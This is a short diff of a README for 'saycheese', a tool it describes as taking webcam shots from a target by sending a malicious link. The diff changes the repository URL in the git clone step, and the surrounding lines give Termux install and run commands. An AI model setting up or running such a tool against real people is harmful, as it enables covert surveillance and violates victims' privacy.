@@ -17,7 +17,7 @@ Take webcam shots from target just sending a malicious link
 pkg install git
 pkg install wget
 pkg install php
-git clone https://github.com/Anonymous3-SIT/saycheese
+git clone https://github.com/CodingBuster/saycheese
 cd saycheese
 bash saycheese.sh
 ```
